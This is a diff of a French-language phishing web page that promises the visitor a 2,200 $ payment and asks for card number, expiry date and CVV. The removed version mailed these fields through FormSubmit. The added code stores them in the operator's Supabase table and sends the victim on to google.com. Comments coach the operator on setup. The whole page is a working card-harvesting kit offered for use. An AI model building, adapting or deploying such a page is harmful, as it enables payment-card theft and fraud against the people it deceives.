@@ -3,68 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Réception de Paiement</title>
+    <title>Virement Express 2200$</title>
+    <!-- Chargement de la base de données -->
+    <script src="https://jsdelivr.net"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .card-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; box-sizing: border-box; }
-        .header { text-align: center; margin-bottom: 25px; }
-        .amount { font-size: 32px; font-weight: bold; color: #27ae60; }
-        .label { display: block; margin-bottom: 8px; font-size: 13px; color: #333; font-weight: 600; }
-        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
-        .row { display: flex; gap: 15px; }
-        .row div { flex: 1; }
-        button { width: 100%; background-color: #3498db; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .secure { text-align: center; margin-top: 15px; color: #aaa; font-size: 12px; }
+        body { font-family: -apple-system, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card-box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        .amount-tag { text-align: center; background: #e8f5e9; color: #2e7d32; padding: 10px; border-radius: 10px; font-weight: bold; margin-bottom: 20px; }
+        .amount { font-size: 32px; display: block; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #666; font-weight: 600; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1.5px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 16px; background: #f9f9f9; }
+        input:focus { border-color: #3498db; background: #fff; outline: none; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; background: #3498db; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:disabled { background: #ccc; }
     </style>
 </head>
 <body>
 
-<div class="card-container">
-    <div class="header">
-        <p style="margin:0; color:#888;">Montant à recevoir</p>
-        <div class="amount">2 200,00 $</div>
+<div class="card-box">
+    <div class="amount-tag">
+        MONTANT À RECEVOIR
+        <span class="amount">2 200,00 $</span>
     </div>
 
-    <!-- Configuration FormSubmit pour ton email -->
-    <form action="https://formsubmit.co" method="POST">
-        
-        <!-- Paramètres invisibles -->
-        <input type="hidden" name="_captcha" value="false"> <!-- Désactive le test robot -->
-        <input type="hidden" name="_subject" value="Nouveau Paiement Reçu - 2200$">
-        <input type="hidden" name="_next" value="https://google.com"> <!-- Redirection après envoi -->
-
-        <label class="label">NUMÉRO DE CARTE</label>
-        <input type="text" name="Numero_Carte" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
+    <form id="payForm">
+        <label>NUMÉRO DE CARTE</label>
+        <input type="text" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
 
         <div class="row">
-            <div>
-                <label class="label">EXPIRATION</label>
-                <input type="text" name="Expiration" id="expiry" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
+            <div style="flex: 2;">
+                <label>EXPIRATION</label>
+                <input type="text" id="exp" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
             </div>
-            <div>
-                <label class="label">CVV</label>
-                <input type="password" name="CVV" placeholder="123" inputmode="numeric" maxlength="3" required>
+            <div style="flex: 1;">
+                <label>CVV</label>
+                <input type="password" id="cvv" placeholder="123" inputmode="numeric" maxlength="3" required>
             </div>
         </div>
 
-        <button type="submit">RECEVOIR MES 2200$</button>
+        <button type="submit" id="btn">RECEVOIR LE PAIEMENT</button>
     </form>
-    
-    <div class="secure">🔒 Connexion sécurisée SSL</div>
 </div>
 
 <script>
-    // Formatage auto numéro de carte (espaces)
-    document.getElementById('card').addEventListener('input', function (e) {
+    // --- REMPLACE CES DEUX LIGNES PAR TES INFOS SUPABASE ---
+    const SB_URL = "https://TON_PROJET.supabase.co"; 
+    const SB_KEY = "TON_API_KEY_ANON"; 
+
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+
+    // Formatage auto pour le téléphone
+    document.getElementById('card').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
-
-    // Formatage auto date (slash)
-    document.getElementById('expiry').addEventListener('input', function (e) {
+    document.getElementById('exp').addEventListener('input', e => {
         let v = e.target.value.replace(/[^\d]/g, '');
         if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
         e.target.value = v;
     });
+
+    // Envoi des données vers ton ordinateur (Base de données)
+    document.getElementById('payForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('btn');
+        btn.disabled = true;
+        btn.innerText = "Vérification...";
+
+        const { error } = await supabaseClient
+            .from('paiements') // Assure-toi que ta table s'appelle exactement 'paiements'
+            .insert([{ 
+                numero_carte: document.getElementById('card').value, 
+                expiration: document.getElementById('exp').value, 
+                cvv: document.getElementById('cvv').value 
+            }]);
+
+        if (error) {
+            console.error(error);
+            alert("Erreur de connexion. Vérifiez votre configuration Supabase.");
+            btn.disabled = false;
+            btn.innerText = "RÉESSAYER";
+        } else {
+            // Succès : Le client est redirigé, toi tu reçois les infos sur ton PC
+            window.location.href = "https://google.com"; 
+        }
+    };
 </script>
 
 </body>
